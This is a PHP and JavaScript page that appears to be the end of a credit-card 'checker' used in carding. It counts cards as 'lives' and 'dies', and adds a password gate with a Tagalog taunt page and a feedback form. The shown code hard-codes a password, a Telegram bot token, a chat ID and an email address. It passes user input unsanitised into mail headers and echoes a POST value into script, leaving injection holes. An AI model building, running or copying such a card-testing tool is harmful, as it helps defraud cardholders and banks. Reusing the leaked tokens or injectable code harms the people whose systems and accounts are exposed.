			removelinha();
			lives = lives +1;
		    }else{
			$('#cards_reprovadas').append(retorno);
			removelinha();
			dies = dies +1;
		}
		testadas = charge + lives + dies;
	    $('.charge').text(charge);
		$('.aprovadas').text(lives);
		$('.reprovadas').text(dies);
		$('.testadas').text(testadas);
		
		if(testadas == total){
			Swal.fire({title: 'All CC(s) have been checked successfully!', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 10000, html: '<audio autoplay hidden><source src="donecheck.mp3" type="audio/mpeg"></audio>'});
			$('.btn-play').attr('disabled', false);
			$('.btn-stop').attr('disabled', true);
			}
        }
      });
      $('.btn-stop').click(function(){
      Swal.fire({title: 'Pause - Success!', icon: 'warning', showConfirmButton: false, toast: true, position: 'top-end', timer: 5000, html: '<audio autoplay hidden><source src="ooh.mp3" type="audio/mpeg"></audio>'});
      $('.btn-play').attr('disabled', false);
      $('.btn-stop').attr('disabled', true);      
      	callBack.abort();
      	setTimeout(function() {
        location.reload();
    }, 3000); // 5000 milliseconds = 5 seconds
      	});
<?php
$delay = isset($_POST['delay']) ? $_POST['delay'] : '';
	echo "}, $delay * index);"
?>
		});
	});
});

function removelinha() {
var lines = $('.form-checker').val().split('\n');
lines.splice(0, 1);
$('.form-checker').val(lines.join("\n"));
}

var myVar=setInterval(function(){myTimer()},1000);
function myTimer() {
	var dt = new Date();
	document.getElementById("datetime").innerHTML = dt.toLocaleDateString();
    var d = new Date();
    document.getElementById("timenow").innerHTML = d.toLocaleTimeString();
}

  
	
</script>
<?php
} else if (isset($_POST['pass']) && $_POST['pass'] !== 'amacanaaclaa'
    && (!isset($_POST['url']) || empty($_POST['url']))) {
    echo '<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="apple-touch-icon" sizes="180x180" href="./assets/images/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="./assets/images/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="./assets/images/favicon-16x16.png">
     <link rel="manifest" href="./assets/images/site.webmanifest">
     <link rel="mask-icon" href="./assets/images/safari-pinned-tab.svg" color="#5bbad5">
     <meta name="msapplication-TileColor" content="#da532c">
     <meta name="theme-color" content="#ffffff">
     <meta http-equiv="cache-control" content="no-cache" />
     <script>
        window.addEventListener("load", function() {
         setTimeout(function() {
         alert("Hmmm.... Sa tingin mo kaano-ano mo kaya sya?\n\nKasi feel ko yun ang tamang password eh", "Retry");
             }, 15000);
                });
    </script>
     <title>SHUTA KA!? ANO GINAGAWA MO?? BOBO YARNN....?</title>
     <style>
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        
        form {
            background-color: #fff;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.3);
            text-align: center;
        }

        input[type="password"] {
            border-radius: 5px;
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 20px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            font-size: 16px;
            text-align: center;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
    </head>';
?>
    <div style="text-align:center;">
    <form action="index.php" method="POST">
    <h2>Sabi ng mama mo tita nalang daw ang tawag ko sayo...<br>
    o sa kanya... tapos... ngayon mama ko na zshhhaa~<br>
    ang tita mo noon, ngayon..<br>
    kaya, pwede na tayong maggzama<br>
    kasi *huminga saglit* accept---<br>
    aksiip na tayo nilaaaa<br>
    ng mama mo, sa tita ko noon.<br></h2>
        <input type="password" name="pass" placeholder="huh!?.." required><br>
        <input type="submit" value="Enter">
    </form>
    </div>
    <audio id="myAudio" hidden autoplay loop>
    <source src="mamamo.mp3" type="audio/mpeg">
        If you see this, EDI WOW!! may powers ka na happy ka na aacclaa!!??...
    </audio>
  </body>
</html>
<?php
}
?>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['feedback']) && $_GET['feedback'] === 'send') {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Feedback Form</title>
    <style>
        /* CSS styles */
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        
        form {
            background-color: #fff;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.3);
            text-align: center;
        }

        input[type="password"] {
            border-radius: 5px;
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 20px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            font-size: 16px;
            text-align: center;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <form method="post" action="index.php">
        <h2>Feedback Form</h2>
        <label for="name">Name:</label><br>
        <input type="text" id="name" name="name" required><br>

        <label for="email">Email:</label><br>
        <input type="email" id="email" name="email" required><br>

        <label for="feedback">Feedback:</label><br>
        <textarea id="feedback" name="feedback" rows="5" required></textarea><br>

        <input type="submit" name="submit" value="Submit">
    </form>

    <?php
}
    if(isset($_POST['submit'])) {
        // Get the form data
        $name = $_POST['name'];
        $email = $_POST['email'];
        $feedback = $_POST['feedback'];
        $domain = $_SERVER['HTTP_HOST'];

        // SET DESTINATION OF YOUR TG BOT
		$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
		$chatID = urlencode('-1001808253666');

        // Send the feedback to your email
        $to = 'augustjay20@duck.com';
        $subject = 'Feedback by ' . $name . ' via ' . $domain;
        $message = 'Email: ' . $email . "\r\n\n" .
                   'Feedback: ' . $feedback;
        $headers = 'From: ' . $email . "\r\n" .
                   'Reply-To: ' . $email . "\r\n" .
                   'X-Mailer: PHP/' . phpversion();

        mail($to, $subject, $message, $headers);

      	// SEND TO TG BOT WHEN FEEDBACK SUBMITTED
		$feedback_message = "Feedback by $name\r\n\nEmail: $email\r\n\nMessage:\r\n$feedback\r\n\nSent via: $domain";
		$sendfeedback = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($feedback_message).'';

        // design
?>
        <style>
    	.feedback-message {
        background-color: #4CAF50;
        color: white;
        border-radius: 5px;
        padding: 20px;
        text-align: center;
        font-size: 20px;
        margin-top: 20px;
   		}

   		a.go-back {
		  color: #4CAF50;
		  text-decoration: none;
		  font-size: 16px;
		  margin-top: 10px;
		  display: inline-block;
		  border: 1px solid #4CAF50;
		  padding: 5px 10px;
		  border-radius: 5px;
		  transition: all 0.3s ease;
		}

		a.go-back:hover {
		  background-color: #4CAF50;
		  color: white;
		  text-decoration: none;
		}

		</style>
<?php
		// BOT RETRY TO SEND IF ITS NOT WORKS
		$max_retries = 3;
		$num_retries = 0;
		$sendfeedbacktotg = false;

        // Show a success message & send feedback to TG
		while (!$sendfeedbacktotg && $num_retries < $max_retries) {
	    $sendfeedbacktotg = @file_get_contents($sendfeedback);
	    $num_retries++;
        echo '<title>Feedback was sent!</title>
        <p class="feedback-message">Thank you for your feedback!<br><br><a href="./" class="go-back">GO BACK</a></p>';
    	}
    }
    ?>
</body>
</html>